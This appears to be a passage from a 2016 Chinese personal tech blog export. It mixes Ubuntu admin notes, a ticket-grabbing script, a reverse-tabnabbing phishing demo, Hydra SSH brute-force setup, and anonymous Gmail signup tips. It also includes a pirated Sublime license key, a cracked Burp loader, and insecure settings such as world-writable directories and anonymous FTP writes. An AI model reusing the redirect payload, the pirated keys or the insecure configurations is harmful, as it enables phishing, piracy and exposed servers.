server.login(from_addr, password) # 认证 这里的 password 不是QQ邮箱密码开启SMTP服务器后生成的授权码 server.sendmail(from_addr, [to_addr], msg.as_string()) server.quit()\"\"\" 格式化邮件正文信息\"\"\"def _format_addr(s): name, addr = parseaddr(s) return formataddr(( \\ Header(name, 'utf-8').encode(), \\ addr.encode('utf-8') if isinstance(addr, unicode) else addr))\"\"\" 程序循环入口\"\"\"def main(): # 选择座位类型 select_seat() success = False # 每个10秒钟发送一个请求查询票源情况 while not success: success = refresh() time.sleep(10)if __name__ == '__main__': main() config.py 这里根据需求进行修改，可以修改车次，座位类型，收件人邮箱账号 12345678910111213141516# coding: utf-8# 配置文件 -----------------------------------------------# 点击查询时按钮发送的请求 URL (浏览器 F12 查看 network 选项卡 能看到这个请求)url = 'https://kyfw.12306.cn/otn/lcxxcx/query?purpose_codes=ADULT&amp;queryDate=2016-10-06&amp;from_station=OXH&amp;to_station=HFH'# 期望刷到的火车编号trains = ['G3245','G105']# 期望刷到的座位类型# 从 ['二等座','硬卧','硬座'] 中选一个填写seat_type = '二等座'# 刷到火车票洪接收通知的邮件账户，成功后会向该账户发送一封提示邮件email = 'anka9080@foxmail.com' 源码下载GitHub: https://github.com/Evi1CLAY/CoolPool/tree/master/Python/12306","categories":[],"tags":[{"name":"12306抢票","slug":"12306抢票","permalink":"http://www.evilclay.com/tags/12306抢票/"},{"name":"自动化","slug":"自动化","permalink":"http://www.evilclay.com/tags/自动化/"}]},{"title":"Ubuntu配置PPTP服务器","slug":"Ubuntu配置PPTP服务器","date":"2016-09-19T17:57:56.000Z","updated":"2016-09-19T18:42:00.328Z","comments":true,"path":"2016/09/20/Ubuntu配置PPTP服务器/","link":"","permalink":"http://www.evilclay.com/2016/09/20/Ubuntu配置PPTP服务器/","excerpt":"","text":"以前在 VPN 服务器配置这块浪费了很多时间，今天发现比较好的脚本安装方式，主要记录下使用过程中的小坑 :P ###下载安装 1234wget https://raw.githubusercontent.com/Evi1CLAY/CoolPool/master/Script/ubuntu-onekey-pptp-vpn/setup.shsudo sh setup.sh -u 用户名 -p 密码// 下面这种方式或默认生成用户名vpn以及随机密码sudo sh setup.sh 安装之后可以通过修改配置文件的方式重新设定用户口令： 123vim /etc/ppp/chap-secrets// 按照这种格式修改并保存anka9080 pptpd woshimima * 使用感受安装是没问题的，有时候使用本地主机连接不上，可能是本地网络（路由）不支持，比如我现在可以用手机在运营商网络的状态下链接成功，在本地无线网的状态下连接失败！ 如果验证的时候用户或密码错误，错误代码是 691 有时候输入正确的用户名口令连接不上，返回的错误代码 619 重启 PPTP 服务再进行连接 需要对 VPN 服务器做一些配置，才能将其用于二层VPN连接 项目地址https://raw.githubusercontent.com/Evi1CLAY/CoolPool/master/Script/ubuntu-onekey-pptp-vpn/","categories":[],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"http://www.evilclay.com/tags/Ubuntu/"},{"name":"PPTP","slug":"PPTP","permalink":"http://www.evilclay.com/tags/PPTP/"}]},{"title":"Ubuntu命令行配置静态IP","slug":"Ubuntu命令行配置静态IP","date":"2016-09-19T17:41:02.000Z","updated":"2016-10-02T17:41:15.515Z","comments":true,"path":"2016/09/20/Ubuntu命令行配置静态IP/","link":"","permalink":"http://www.evilclay.com/2016/09/20/Ubuntu命令行配置静态IP/","excerpt":"","text":"vim /etc/network/interfaces 原内容如下：// 表示默认使用 DHCP 分配 IP auto lo iface lo inet loopback auto eth0 iface eth0 inet dhcp 配置静态IP：这里是给网卡 eth0 做配置，具体需要配置哪个网卡可以使用 ifconfig 查看下 123456789# The primary network interfaceauto eth0#iface eth0 inet dhcpiface eth0 inet staticaddress 192.168.80.129netmask 255.255.255.0gateway 192.168.80.2 手动设置 DNS 服务器1# vim /etc/resolv.conf 添加如下内容（这点所有Linux发行版都通用）： 12nameserver 192.168.80.2nameserver 8.8.8.8 重启使配置生效1/etc/init.d/networking restart","categories":[],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"http://www.evilclay.com/tags/Ubuntu/"}]},{"title":"新Get的Sublime快捷操作","slug":"新Get的Sublime快捷操作","date":"2016-09-17T10:34:52.000Z","updated":"2016-09-17T10:35:14.097Z","comments":true,"path":"2016/09/17/新Get的Sublime快捷操作/","link":"","permalink":"http://www.evilclay.com/2016/09/17/新Get的Sublime快捷操作/","excerpt":"","text":"User 中的设置会覆盖 Default 任意位置光标移动到下一行 Ctrl + Enter 格式化 HTML Ctrl + Shift + P 命令面板运行 Reindent Lines 分屏显示 Alt + Shift + 数字 指定编写语言 Ctrl + Shift + P 命令面板输入语言名 绑定快捷键 修改 key-bindings-user 文件 查找文件 Ctrl + P","categories":[],"tags":[{"name":"Sublime","slug":"Sublime","permalink":"http://www.evilclay.com/tags/Sublime/"}]},{"title":"Ubuntu装完系统后的几条配置","slug":"Ubuntu装完系统后的几条配置","date":"2016-09-12T16:46:08.000Z","updated":"2016-09-12T16:53:36.704Z","comments":true,"path":"2016/09/13/Ubuntu装完系统后的几条配置/","link":"","permalink":"http://www.evilclay.com/2016/09/13/Ubuntu装完系统后的几条配置/","excerpt":"","text":"OS : Ubuntu16.04 安装搜狗输入法 官网下载 deb 包 双击打开，等一会出现软件包安装界面 SustemSetting - LanguageSupport 等待自动更新完毕 im-config 下一步下一步 重启 点击右上角通知栏键盘图标，添加输入法，取消Only Show Current Language选项会显示所有语言的输入法，搜索sogou添加即可。 安装Sublime Text3$ sudo add-apt-repository ppa:webupd8team/sublime-text-3 $ sudo apt-get update $ sudo apt-get install sublime-text-installer Lisence:—– BEGIN LICENSE —– Michael Barnes Single User License EA7E-821385 8A353C41 872A0D5C DF9B2950 AFF6F667 C458EA6D 8EA3C286 98D1D650 131A97AB AA919AEC EF20E143 B361B1E7 4C8B7F04 B085E65E 2F5F5360 8489D422 FB8FC1AA 93F6323C FD7F7544 3F39C318 D95E6480 FCCC7561 8A4A1741 68FA4223 ADCEDE07 200C25BE DBBC4855 C4CFB774 C5EC138C 0FEC1CEF D9DCECEC D3A5DAD1 01316C36 —— END LICENSE —— 安装Package Control按 Ctrl + ` 进去控制台，输入： import urllib.request,os,hashlib; h = &apos;2915d1851351e5ee549c20394736b442&apos; + &apos;8bc59f460fa1548d1514676163dafc88&apos;; pf = &apos;Package Control.sublime-package&apos;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( &apos;http://packagecontrol.io/&apos; + pf.replace(&apos; &apos;, &apos;%20&apos;)).read(); dh = hashlib.sha256(by).hexdigest(); print(&apos;Error validating download (got %s instead of %s), please try manual install&apos; % (dh, h)) if dh != h else open(os.path.join( ipp, pf), &apos;wb&apos; ).write(by) fix中文输入sudo apt-get update &amp;&amp; sudo apt-get upgrade git clone https://github.com/lyfeyaj/sublime-text-imfix.git cd sublime-text-imfix ./sublime-imfix 之后重启 Sublime。 顶端状态栏sudo apt-get install indicator-multiload # 安装 indicator-multiload # 运行 Markdown编辑器 haroopad下载安装包https://bitbucket.org/rhiokim/haroopad-download/downloads/haroopad-v0.13.1-x64.tar.gz 安装haroopadcd ~/opt/haroopad tar zxvf haroopad-v0.13.1-x64.tar.gz -C haroopad.v0.13.1.x64 cd haroopad.v0.13.1.x64 tar zxvf data.tar.gz sudo cp -r ./usr / tar zxf control.tar.gz chmod 755 postinst sudo ./postinst 修复桌面图标sudo vi /usr/share/applications/Haroopad.desktop Icon 的值改成： /usr/share/icons/hicolor/128x128/apps/haroopad.png 设置显示桌面快捷键SystemSetting -- Keyboard -- shortcuts -- Navigations 设置 Hide all normal windows 为 Ctrl + D 安装配置 MySQLsudo apt-get install mysql-server mysql-client libmysqlclient-dev 中途有问题就执行 apt-get update 装好后配置为任意IP可以访问 1.sudo mysql -uroot -p; use mysql; update user set host = &apos;%&apos; where user = &apos;需要授权的用户名&apos;; 2.vi /etc/mysql/my.cnf（Ubuntu14） OR vi /etc/mysql/mysql.conf.d/mysqld.cnf（Ubuntu16） 文件 bind ip 127.0.0.1 改成需要授权的ip 3.重新启动 MySQL 安装 Apachesudo apt install apache2 安装 PHP 模块sudo apt-get install php libapache2-mod-php php-mcrypt php-mysql 在根目录写入phpinfo 进行测试。","categories":[],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"http://www.evilclay.com/tags/Ubuntu/"}]},{"title":"Ubuntu常用命令笔记","slug":"Ubuntu常用命令笔记","date":"2016-09-12T16:33:28.000Z","updated":"2016-09-19T18:17:18.929Z","comments":true,"path":"2016/09/13/Ubuntu常用命令笔记/","link":"","permalink":"http://www.evilclay.com/2016/09/13/Ubuntu常用命令笔记/","excerpt":"","text":"自己的东西用着靠谱，记录下省得到时候还要劳烦搜索引擎，这份笔记会保持更新 xD 显示所有系统变量env apt 查看软件版本，并安装特定版本的软件sudo apt-cache showpkg package // 查看可以安装的版本 sudo apt-get install xxx=x.y.z // 指定版本安装 在新的 Tab 页打开 CMDCtrl + Shift + T 设置环境变量添加全局变量在/etc/profile文件中 vi /etc/profile 添加 export PATH=&quot;$PATH:/etc/apache/bin&quot; 注意：＝ 即等号两边不能有任何空格修改后运行 ./profile 重新加载环境变量使修改生效。 命令行方式给浏览器设置代理Google-Chrome-stable --proxy-server=&quot;127.0.0.1:8080&quot; 默认使用 HTTP 代理，支持 HTTPS, SOCKS. 递归更改文件夹权限sudo chmod -R 777 &lt;dirname&gt; 修改本机 HOSTS 文件sudo vi /etc/hosts 从命令行打开可视化当前目录nautilus 运行 jar 包java -jar &lt;jarname&gt; 查找命令在系统中的位置which ls # 查找 ls 命令的默认位置 whereis ls # 查找 系统中所有叫做 ls 的文件和文件夹 tar 压缩tar -xzvf file.tar.gz # 解压缩到当前目录 取消MySQL开机自启动vi /etc/inid/mysql.cnf // 对应的条目修改成以下 #start on runlevel[2345] stop on starting rc RUNLEVEL=[0123456] 关闭 mysql 服务sudo service mysql stop 取消 Apache 开机自启动update-rc.d -f apache2 remove 截图gnome-screenshot -a // 手动截取选定区域 运行 Burp Suite得到BurpLoader.jar burpsuite_pro_v1.5.20.jar文件，移动到/opt/burp文件夹内 sudo chmod +x BurpLoader.jar burpsuite_pro_v1.5.20.jar sudo touch /usr/bin/burp &amp;&amp; sudo chmod +x /usr/bin/burp // burp 的文件内容为： #! /bin/bash java -jar /opt/burp/BurpLoader.jar 配置右键打开终端sudo apt-get install nautilus-open-terminal // 重启生效 配置 FTP 服务器apt-get install vsftpd // 需要先安装 FTP 服务 service vsftpd start // 启动 打开 /etc/vsftpd 修改下面几项： listen=YES // 开启服务 anonmyous_enable=YES // 允许匿名登录 local_enable=YES // 允许本地用户登录 write_enable=YES // 允许全局写权限 local_umask=022 // 设置访问权限 上一条写权限同样适用 // 022表示7（rwx）5（rx）5（rx） // u 所有者 g 同组人员 o 其他组人员 进程相关pkill -9 进程名 // 通过进程名杀死(-9 表示强制) kill -9 进程ID // 通过进程ID杀死 netstat [-lnp|-anp|-tnp] | grep 8000 // 查找使用8000端口号的进程 ps -aux // 显示所有用户的进程并打印相应的CMD命令 Ubuntu 设置静态 IPsudo vim /etc/network/interfaces // 修改成如下 auto eth0 iface eth0 inet static address 192.168.0.117 gateway 192.168.0.1 netmask 255.255.255.0 network 192.168.0.0 broadcast 192.168.0.255 重启服务 service networking restart Ubuntu 设置临时 IPifconfig eth0 192.168.1.130 netmask 255.255.255.0 up // IP 子网掩码 route add default gw 192.168.1.1 // 网管 vim /etc.resolv.conf 添加 nameserver 8.8.8.8 // DNS 开启 关闭 SSHservice ssh start/stop // 需要先安装 SSH 禁止 Ping 主机echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all 查看系统磁盘使用率df -h 查看内核版本uname -a 查看 CPU ,内存top // 查看 CPU ， 内存情况 free -h // 查看内存使用率 安装/卸载 .deb 包sudo dpkg -i package.deb // 安装 sudo dpkg -r package // 卸载 将普通用户（anka9080）添加到 sudoersadduser anka9080 //填写好密码之后 sudo vi /etc/sudoers // 在 root ALL=(ALL) ALL 下一行添加 anka9080 ALL=(ALL) ALL zip 压缩解压缩zip -r new.zip dirname unzip new.zip Linux 目录介绍 / 根目录，必须要挂载的目录 1-2G（主分区） /boot 引导目录，建议单独挂载 大小100M（主分区） /swap 交换分区，设置为物理内存的2倍，若物理内存&gt;2G，设为2G，类似Win下虚拟内存，休眠时会用到 /home 用户home目录所在地，容量依普通用户数量定，一般每个用户100M（主分区） /opt 第三方应用程序默认安装目录 /usr 系统软件所在目录 /var 动态的应用程序数据，余下空间（10-20G） 设置Apache 支持 GD库 扩展apt-get install php5-gd // 重启服务器 设置 MySQL 外网可访问：use mysql; update user set host = &apos;%&apos; where user = &apos;需要授权的用户名&apos;; 修改 /etc/mysql/my.cnf 文件 bind ip 127.0.0.1 改成需要授权的ip 重新启动 MySQL 安装 Flaskpip install flask Ubuntu14.04 安装 LAMPapt-get install apache2 php5-mysql libapache2-mod-php5 mysql-server Python 安装 MySQL库sudo pip install mysql-python // 若报错 pip install mysql-python fails with EnvironmentError: mysql_config not found sudo apt-get install libmysqlclient-dev // 若报错 fatal error: Python.h: No such file or directory sudo apt-get install python-dev Ubuntu 查看当前远程链接用户w ssh 日志存放位置/var/log/auth.log 查看SSH最近几次 成功登录的日志last 若因为wtmp文件不存在导致last命令不可用，可以手动创建 wtmp 文件 touch /var/log/wtmp chmod 0664 /var/log/wtmp chown root:utmp /var/log/wtmp Ubuntu连接 PPTP VPN服务器新建一个 VPN 连接，点击 Edit，按如下图配置 查看文件夹大小du -sh [filename|dirname] split 分割文本文件split -b 50m es.zip es_part_ // 分割后每个文件大小50m // 组装分割后的文件 cat es_part_* &gt; es.zip // 计算md5sum md5sum es.zip 查找当前目录下所有包含某字符串的文本文件grep -rn str * -r 递归遍历 -n 显示行号 SSH 连接到其他主机ssh user@xxx.xxx.xxx.xxx 修复Ubuntu中文输入出现两个输入框// kill 掉fcitx-qimpanel这个进程。 user@linux:~$ ps -A | grep fcitx","categories":[],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"http://www.evilclay.com/tags/Ubuntu/"}]},{"title":"Target_Blank 漏洞分析","slug":"Target-Blank漏洞分析","date":"2016-09-11T07:58:16.000Z","updated":"2016-09-11T08:32:06.306Z","comments":true,"path":"2016/09/11/Target-Blank漏洞分析/","link":"","permalink":"http://www.evilclay.com/2016/09/11/Target-Blank漏洞分析/","excerpt":"","text":"概述在浏览器中点击 target=&#39;_blank&#39; 的标签后，新标签的站点可以通过 windows.opener 对原标签的进行访问，进而可能会导致钓鱼事件或拿到用户的浏览历史。 Demo在这个 Demo 中，打开原网站( index.html )中的 一个链接( evil.html )，会在新Tab打开新的页面，同时原 Tab 中的网站会被替换成另一个网站。 原网站代码( index.html ): &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Index Page&lt;/title&gt; &lt;/head&gt; &lt;body&gt; Target_Blank_Vuln Demo: &lt;br&gt; &lt;br&gt; After u click the evil site , this page will be replaced to another site silently! &lt;br&gt;&lt;br&gt; &lt;!-- Fixed --&gt; &lt;!-- &lt;a href=&quot;evil.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Evil Site&lt;/a&gt; --&gt; &lt;!-- Vuln --&gt; &lt;a href=&quot;evil.html&quot; target=&quot;_blank&quot;&gt;Evil Site&lt;/a&gt; &lt;/body&gt; &lt;/html&gt; 恶意链接的HTML源码( evil.html ): &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Evil Site&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; if (window.opener) { window.opener.location = &quot;http://www.evilclay.com&quot;; } &lt;/script&gt; &lt;h2&gt;hey, I have Got U.&lt;/h2&gt; &lt;br&gt; &lt;h2&gt;Look Back :P&lt;/h2&gt; &lt;/body&gt; &lt;/html&gt; 分析： 通过 target=&quot;_blank&quot; 打开的新的标签页中的网站 evil.html 会控制原标签页的内容，在这里会把原标签重定向到 www.evilclay.com . 测试 浏览器访问 index.html ， 页面如下： 点击 index.html 中的 链接，发现在新的Tab打开链接，同时原Tab正在跳转至另外一个网站(在 Javascript 中自定义的链接)。 返回原 Tab 页面，确实已经不是之前的页面了。 利用场景这个漏洞的利用条件是攻击者可以在正常页面中加入自己网站的一个链接，从而可以拿来对其他用户进行钓鱼攻击。先伪造好一个与原网站一样的页面，其他用户点击这个连接时，替换原网页的内容，将用户导向到钓鱼网站上，在移动端的利用应该会更隐蔽 目前，Twitter 依然没有 fix 这个漏洞，自己可以在 Twitter 的个人简介中添加链接进行测试 xD 参考 https://dev.to/ben/the-targetblank-vulnerability-by-example","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://www.evilclay.com/tags/漏洞分析/"}]},{"title":"Ubuntu16.04 编译安装最新版Hydra","slug":"Ubuntu16.04-编译安装最新版Hydra","date":"2016-09-10T18:29:19.000Z","updated":"2016-09-10T19:00:29.139Z","comments":true,"path":"2016/09/11/Ubuntu16.04-编译安装最新版Hydra/","link":"","permalink":"http://www.evilclay.com/2016/09/11/Ubuntu16.04-编译安装最新版Hydra/","excerpt":"","text":"前言：因为在最新版的Hydra在 Ubuntu14.04 下编译安装确实有蜜汁Bug，参考Github上的这个 Issue (https://github.com/vanhauser-thc/thc-hydra/issues/147) 所以不得不装了 Ubuntu16.04 再把它撸一遍 = =。然后，我发现其实官网一定要看仔细了，因为最权威的操作往往都是从官网流出来的，只是自己没注意而已。 装第三方依赖库 装环境之前更新下源包 1sudo apt-get update 因为要使用 SSL 爆破功能所以需要用到 libssh 库，图方便把官网给出的第三方库都给装上得了。 参考： https://www.thc.org/thc-hydra/ 1sudo apt-get install libssl-dev libssh-dev libidn11-dev libpcre3-dev libgtk2.0-dev libmysqlclient-dev libpq-dev libsvn-dev firebird2.1-dev libncurses5-dev 由于官网给出的 libncp-dev 这个库装不上，所以我把它删掉了，需要的时候可以自行搜索装上，目前用不到~ 编译安装 Hydra 在 GitHub （https://github.com/vanhauser-thc/thc-hydra/releases）上下载最新版本，目前是8.3。 解压归档文件 1tar -xzvf thc-hydra-8.3.tar.gz 进入解压后的文件编译并安装 1234cd thc-hydra-8.3/./configuremakesudo make install 至此已经成功安装了 ;-) 测试 ssh 爆破如图所示，已经爆破出密码： 参考 https://www.thc.org/thc-hydra/ 第三方依赖库 https://github.com/vanhauser-thc/thc-hydra/releases Hydra 最新版下载地址","categories":[],"tags":[{"name":"Hydra","slug":"Hydra","permalink":"http://www.evilclay.com/tags/Hydra/"}]},{"title":"Flask-Web项目小结","slug":"Flask-Web项目小结","date":"2016-09-06T14:47:29.000Z","updated":"2016-09-06T15:36:06.363Z","comments":true,"path":"2016/09/06/Flask-Web项目小结/","link":"","permalink":"http://www.evilclay.com/2016/09/06/Flask-Web项目小结/","excerpt":"","text":"项目文件结构 libs 一些声明的类和函数文件夹 static 静态文件文件夹 templates HTML模板文件文件夹 config.py 项目配置文件 app.py 项目入口文件 CHANGELOG.md 项目更新log README.md 项目介绍文件 说明 功能函数以及类函数 统一写在 libs 文件夹内 MySQL的配置参数，入口口令等（一些根据情况需要自定义的参数）全局参数统一使用config.py的方式配置。 app_secret_key这种在项目中不需要变动的参数可以写在app.py文件中。app.py 文件除了一些route定义不应该包含其他的方法。 一些类若需要在路由函数中调用，其实例化放在 app.py 路由区域前。 关于路由忽略 get/post 型 @app.route(&apos;/&apos;) 判断是否是 GET 请求 if request.method == &apos;GET&apos;: 重定向使用 redirect(&apos;/login&apos;) 返回错误信息 return &apos;&lt;html&gt;&lt;script&gt;alert(&apos;Some ERR message&apos;)&lt;/script&gt;&lt;/html&gt;&apos; 判断是GET请求中是否有某参数 if request.args.has_key(&apos;somekey&apos;): 从GET请求里取出某参数，不存在则设为默认值： request.args.get(&apos;keyname&apos;,&apos;defaultvalue&apos;) 刷新数据使用 JSON 的数据格式 return json.dump(dict_var) 关于数据库操作 数据库类写在libs.models文件中 数据库连接信息从config.py文件中读取 __init__方法包含 self._conn 和 self._cur 的定义,connhe cur 都是私有变量 查询，更新，插入操作统一用 query/update/insert 方法，而且需要使用 try..catch 包围。返回游标执行SQL语句的结果 12345678try: sql op.. result = ...except MySQLdb.Error,e: err_msg = '[-] MySQL err!',e.args[0],e.args[1] print err_msg result = Falsereturn result 常用方法 a. 获得所有数据 fetch_all self._cur.fetchall() b. 获得一行数据 fetch_one self._cur.fetchone() c. 获得返回结果的数量 get_count self._cur.rowcount d. 关闭连接 close 12345try: self._cur.close() self._conn.close()except: pass","categories":[],"tags":[{"name":"Flask","slug":"Flask","permalink":"http://www.evilclay.com/tags/Flask/"}]},{"title":"Celery-分布式任务队列小记","slug":"Celery-分布式任务队列小记","date":"2016-09-06T14:11:37.000Z","updated":"2016-09-10T18:58:28.347Z","comments":true,"path":"2016/09/06/Celery-分布式任务队列小记/","link":"","permalink":"http://www.evilclay.com/2016/09/06/Celery-分布式任务队列小记/","excerpt":"","text":"需求： 分布式 + 异步 处理任务 概念 任务队列：可以做到在线程间或机器间分发任务。 Worker 进程：持续监视队列中是否有需要处理的新任务。 中间人（Broker）：负责把队列中的任务派送给Worker处理。 Celery系统可以包含多个Worker 和 Broker，一次获得高可用性和横向扩展能力。 消费者代码 tasks.py 启动消费者进程celery -A tasks worker --loglevel=info 生产者添加任务 消费者处理任务 tasks.py 源码：Evi1CLAY Git 参考： http://docs.jinkan.org/docs/celery/ http://www.ibm.com/developerworks/cn/opensource/os-cn-celery-web-service/index.html","categories":[],"tags":[{"name":"Celery","slug":"Celery","permalink":"http://www.evilclay.com/tags/Celery/"},{"name":"分布式","slug":"分布式","permalink":"http://www.evilclay.com/tags/分布式/"},{"name":"异步","slug":"异步","permalink":"http://www.evilclay.com/tags/异步/"},{"name":"任务调度","slug":"任务调度","permalink":"http://www.evilclay.com/tags/任务调度/"}]},{"title":"Flask-Web应用前端通用布局","slug":"Flask-Web应用前端通用布局","date":"2016-09-05T12:54:04.000Z","updated":"2016-09-05T12:54:45.506Z","comments":true,"path":"2016/09/05/Flask-Web应用前端通用布局/","link":"","permalink":"http://www.evilclay.com/2016/09/05/Flask-Web应用前端通用布局/","excerpt":"","text":"Head 区域（不包含JSFile） 含有子页面可以覆盖的 beforecss 区块 Body 区域（block body）1.导航区域 nav 配合 bootstrap 实现 2. Container 区域 row最外层，col-md-12 次外层，内层根据需求来填充。 3.Modal 区域 尾部JS区域 通用JS 写在base.html里面 自定义JS使用覆盖afterjs 区块的方式实现 More Tips…静态文件的目录结构： static/ css/ lib/ bootstrap.css style.css home.css admin.css js/ lib/ jquery.js home.js admin.js img/ logo.svg favicon.ico","categories":[],"tags":[{"name":"Flask","slug":"Flask","permalink":"http://www.evilclay.com/tags/Flask/"}]},{"title":"匿名注注册Google邮箱","slug":"匿名注册Google邮箱","date":"2016-08-21T05:26:33.000Z","updated":"2016-08-21T05:28:13.397Z","comments":true,"path":"2016/08/21/匿名注册Google邮箱/","link":"","permalink":"http://www.evilclay.com/2016/08/21/匿名注册Google邮箱/","excerpt":"","text":"不需要邮箱验证，不需要手机验证 注意： 需要先连接香港的VPN服务器，日本的Vultr 测试失败 从 www.gmail.com 入口，点击注册。 姓氏要手打。（No老师说的） 电话区域的区号选择 特克斯和凯科斯群岛 (Turks &amp; Caicos Islands) 邮件区域不用填写 地区选择 特里斯坦-达库尼亚群岛 (Tristan da Cunha) 测试结果： 新做的VPN，初次创建Google用户成功，5分钟后同样参数创建用户失败，隔两天后再次创建用户成功。","categories":[],"tags":[{"name":"Gmail","slug":"Gmail","permalink":"http://www.evilclay.com/tags/Gmail/"}]},{"title":"python模拟登录并保持cookie","slug":"python模拟登录并保持cookie","date":"2016-07-24T17:03:49.000Z","updated":"2016-07-24T17:21:58.277Z","comments":true,"path":"2016/07/25/python模拟登录并保持cookie/","link":"","permalink":"http://www.evilclay.com/2016/07/25/python模拟登录并保持cookie/","excerpt":"","text":"前言最近在爬行 nosec.org 的数据，看了下需要模拟登录拿到cookie后才能访问想抓的数据，重要的是 nosec.org 的登录页面 form 中有个 authenticity_token 字段每次访问登录页面都会自动生成，而且会和你的用户名，密码一样被POST到服务器。 经过一番研究后发现，直接访问网站登录界面的时候，服务器的响应头会有一个Set-Cookie字段，如下： 1234_nosec_session=ZTlHNmxuZXE4R0s1UXpsVUxGRTNPblNBWFd2TXU4TU9aNWVJM2lyLzNFY0pLeUdNMDY1cmZqanpkc0ppaGtjUi9kTGdWenBrNXJKenNqbnN2YUxucE1DRW5UMHNTR1RxWDZPeGlLazllTmY1czVpYWplazJXdWkvZS9wUHJpc1Jya3ZzcmNVMytPRit2T1dEcGx4bHNDTTVzSmVTb0xhSjRycE03QUl5RXE5Z2tZWG1mTHFBWGx1QW52QjBURi8rLS1acE8yeVRtMFRZR1JWdExneStwdmpRPT0%3D--a6ccd9a12a8af5c8b5fb6625c24bb4db0398c503; path=/; HttpOnly 而且页面form 的表单有一个 authenticity_token 的 input ，内容如下： 1&lt;input type=\"hidden\" name=\"authenticity_token\" value=\"cGdhqVxDMRndpKbpvIV66wfEQlGf4Rz6UtXqsf79brEvFveHw2rCc6uz3euFEyUlpuA0azt5uNhnmrUiCaAyUg==\" /&gt; 之前按照后端的逻辑分析_nosec_session 的值 经过解密以及各种xx手法得到 authenticity_token 的值，然后顺带着 username 和 password post就行了，最后发现这真是一个大写的傻逼！！ 老是用后端的思维思考问题，过不得最近走路都走不好了。所以来，直接在页面中抓取已经生成的 authenticity_token 的值，然后 顺着 POST 过去就好了啊。 使用 requests 库 的 Session() 方法，确实很好用，比早期直接拿 cookielib 就干方便多了。 代码类XXX 的 login 方法用来模拟登录，就贴出这部分登录的代码好了。 1234567891011121314151617181920212223class XXX: def login(self): r = self.s.get('https://nosec.org/users/sign_in') html = r.text p1 = re.compile(r'city_token\" value=\"(.*?)\"') res = re.search(p1,html) authenticity_token = str(res.group(1)) print 'authenticity_token:',authenticity_token # print 'cookies',self.s.cookies # print s.cookies data = &#123; 'authenticity_token':authenticity_token, 'user[login]':'xxxxx', 'user[password]':'xxxxx' &#125; r = self.s.post('https://nosec.org/users/sign_in',data=data) # print r.headers # print r.request.headers # print self.s.cookies print '[*] OK!' return True 调用了 login 方法后 下次直接用self.s.get() 请求网页就会带着 cookie 啦。 之前被思路坑了一次，被笔误也坑了一次(https 写成 http)，导致我抓狂了好久才发现这个 “BUG” = =、所以还得多谢 代码，提高排 Bug 的效率 2333！","categories":[],"tags":[{"name":"模拟登录","slug":"模拟登录","permalink":"http://www.evilclay.com/tags/模拟登录/"}]},{"title":"近期更新的 Github Python 脚本","slug":"近期更新的-Github-Python-脚本","date":"2016-07-09T16:12:47.000Z","updated":"2016-07-09T16:14:45.986Z","comments":true,"path":"2016/07/10/近期更新的-Github-Python-脚本/","link":"","permalink":"http://www.evilclay.com/2016/07/10/近期更新的-Github-Python-脚本/","excerpt":"","text":"注： 所有脚本经过本地测试运行 OK。 地址： https://github.com/Evi1CLAY/CoolPool TUST爆破相关脚本 包含三个脚本：模拟登陆，批量爆破账号密码相同的账户，查找使用指定密码的用户 ZoomEyeApiDemo ZoomEyeApi 调用批量获取目标URL测试Demo 20160330 可以成功执行 ascii2word ASCII码转换成字母的小脚本 domain2ip 将域名批量批量解析得到IP地址 Ubuntu_SSH日志分析 分析 Ubuntu /var/log/auth.log 日志文件得到所有试图访问主机的IP以及最后一次试图访问主机的时间 一些功能模块的测试 一些Python第三方库的使用测试，详情戳进去 批量检测域名是否注册 批量检测脚本生成的一堆域名是否被注册的程序，自己想买一个短点的域名所以写了这个 OpensslTest.py 心血漏洞测试脚本，对，就是网上流传的那个Python脚本 auto_naruto.py 玩火影online写的小脚本，自动刷FB以及生存试炼 baidu_spider.py 批量手机百度搜索结果URL的脚本，网上也有类似的URL收集工具，原理不难 choubaiduanzi.py 初学正则时写的爬丑事百科段子的小脚本 deduplicate.py 去重脚本，之前还不知道 set 的存在，好尴尬啊 downloadHTMLByURL.py 输入目标网址，批量下载网站的静态文件并生成对应的目录结构 fast_socket_scanner.py 多线程写的一个端口扫描器 find_file_by_keyword.py 根据关键词搜索文本文件的小脚本，后面经常用到 getSubDomain.py 获得指定网站的二级域名以及对应的IP+地理位置 get_google_count_by_url.py 调用selenium库开启Firefox浏览器抓取数据，这个库多用于自动化吧，想在想想用这个思路抓数据好Low啊 TAT group_count.py 合并相同的字符串并计数 sina_spider.py 爬取 sina url 的小小爬虫 socket_scanner.py socket 实现的端口扫描器","categories":[],"tags":[{"name":"github","slug":"github","permalink":"http://www.evilclay.com/tags/github/"}]},{"title":"爬取 WooYun 论坛所有漏洞条目的相关信息","slug":"wooyun-spider","date":"2016-05-27T10:24:16.000Z","updated":"2016-05-29T03:27:25.450Z","comments":true,"path":"2016/05/27/wooyun-spider/","link":"","permalink":"http://www.evilclay.com/2016/05/27/wooyun-spider/","excerpt":"","text":"每个漏洞条目包含： 乌云ID，漏洞标题，漏洞所属厂商，白帽子，漏洞类型，厂商或平台给的Rank值 主要是做数据分析使用：可以分析某厂商的各类型漏洞的统计；或者对白帽子的能力进行分析….. 数据更新时间：2016/5/27漏洞条目：104796条 数据截图如下： 数据网盘链接： 链接：http://pan.baidu.com/s/1bpDNKOv 密码：6y57 爬虫脚本：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195# 